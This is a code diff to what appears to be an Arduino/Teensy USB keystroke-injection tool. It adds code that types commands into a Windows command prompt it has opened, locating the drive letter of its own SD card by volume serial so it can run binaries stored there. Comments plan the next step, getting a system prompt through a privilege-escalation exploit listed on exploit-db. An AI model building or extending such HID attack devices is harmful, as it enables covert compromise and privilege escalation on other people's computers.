@@ -9,6 +9,9 @@
 
 #include <usb_private.h>
 
+//Storage "VolumeSerialNumber"
+const String STORAGE_SERIAL = "02B4C4D4";
+
 //Trigger Pin
 const int trigger_pin = 23;
 
@@ -175,7 +178,18 @@ void open_command_prompt()
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_key1(0);
-  Keyboard.send_now();  
+  Keyboard.send_now();
+  delay(2000);  
+}
+
+//Find drive letter with given volume name
+//returns drive letter as a string
+void change_to_storage_directory(String volume_serial)
+{
+  // Command that need to be passed:
+  // FOR /F %D IN ('wmic logicaldisk where "VolumeSerialNumber='02B4C4D4'" get deviceid') do %D
+  // Not exactly the most graceful way of doing it but it does work
+  Keyboard.println("FOR /F %D IN (\'wmic logicaldisk where \"VolumeSerialNumber=\'" + volume_serial + "\'\" get deviceid\') do %D");
 }
 
 
@@ -218,8 +232,11 @@ void setup(void)
       //Exploring possibilities of whether to type them from internal storage
       //or just copy them from sd storage. Typing them out will provide better compatibility
       //but the device might not have enough storage.
+      //Below I decided to just access the binaries on the sd card
+      change_to_storage_directory(STORAGE_SERIAL);
+      delay(1000);  //prevents first character from being cut off
       
-      
+      //Keyboard.println("dir");  //For testing purposes
       
       //Get Administrative Priveleges
       //using this exploit (http://www.exploit-db.com/exploits/25912/) to get system prompt.
